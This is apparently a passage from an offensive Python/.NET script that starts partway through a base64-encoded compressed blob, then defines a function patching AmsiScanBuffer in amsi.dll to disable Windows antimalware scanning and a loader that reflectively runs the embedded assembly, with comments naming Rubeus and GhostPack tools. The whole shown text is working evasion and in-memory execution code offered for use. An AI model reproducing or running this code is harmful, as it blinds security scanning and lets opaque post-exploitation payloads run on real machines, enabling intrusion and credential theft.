aoIG2D2BltSz442tXCkYs1uUQ9pwSCdKI6qmOcm/h4Bcbi3nmP5z8vH+R3B6eQbDGxjWp1tojnILPqMGppt/4y/5n+B74ekngANfLeXAJ6G/jKPgCvqzHHslhSP0AsZT6M8BB02ED+37vyw5Qp3MKTvWDo0Yb/ib4bxlvrid47vP1p4pP92KNMhL1ZYgzqk0PtPjtNeeYQCidev8ZkkyzzPiXhLOjfGdAn3cHs7+jXMixyLRk2adGKzWdk9skgDf7259M0BbLbuQavMcwHq7PGUaZq9I1kkxx7E6Apjf+zWAfauoadI8hwK4CiEsMw+Uz3o03gp2ksPg+/QbXI9mHoFddMT+1sLqvsBtUJOTBufUad7+fmS6tkhwPa/b8nK2nk479X/qO8ztaO2bqfx/I6U6W3vtJ3H71edttGKjDWVeZhqsM8B5vjKqNi/Nm8o9/wLww9Np999/TExt5TVSscceEccnkVA9W1Bz+npSvJmeC8siMUuKripaQadJsUpNcWqyO9AdSCg2tBpBEbqZFMuGPmFmN2heMcN5B/0vnC3kJxQzH6nERJJX9NwaNR2cK6s+FEaIKyylUr2UK1XrdGKXSBjYXlK8Vp0uFrVcloOeRZRiUYxaEkpG2SwxQLRD6hO3asaSJs2WDazTjiPHoJtl1JOqN4xcJafRdWoeUupF0ZXilYPjXbbMNJ6nFaoRjflJUTFTeqVwjxoiKeemswzJKymuKZpJ7UZxIdEW2jiqR+t0T0RdI2A8EXWMOglHR9sW7rI0eoQ6HNOR0R+ZrkpG"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("scout.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()